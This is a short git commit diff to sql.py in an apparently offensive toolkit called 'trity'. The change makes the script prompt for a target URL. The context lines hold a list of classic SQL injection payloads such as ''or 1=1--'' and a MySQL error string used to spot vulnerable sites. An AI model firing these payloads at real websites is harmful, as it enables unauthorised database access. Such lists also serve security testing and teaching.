48b01d51c10eae188bc3332713bfa9da8067773b
toxic <filip.herle@gmail.com>
2017-06-02 16:44:38 -0700

    Update sql.py

--- trity/sql.py
+++ trity/sql.py
@@ -22,7 +22,7 @@ C  = '\033[36m' # cyan
 GR = '\033[37m' # gray
 T  = '\033[93m' # tan
 def sql():
-    fullurl = (''+T+'' + color.UNDERLINE + 'Full URL> ' + color.END)
+    fullurl = raw_input(''+T+'' + color.UNDERLINE + 'Full URL> ' + color.END)
     errormsg = "You have an error in your SQL syntax"
     payloads = ["'admin'or 1=1 or ''='", "'=1\' or \'1\' = \'1\'", "'or 1=1", "'1 'or' 1 '=' 1", "'or 1=1#", "'0 'or' 0 '=' 0", "'admin'or 1=1 or ''='", "'admin' or 1=1", "'admin' or '1'='1", "'or 1=1/*", "'or 1=1--"] #whatever payloads you want here ## YOU CAN ADD YOUR OWN
     errorr = "yes"
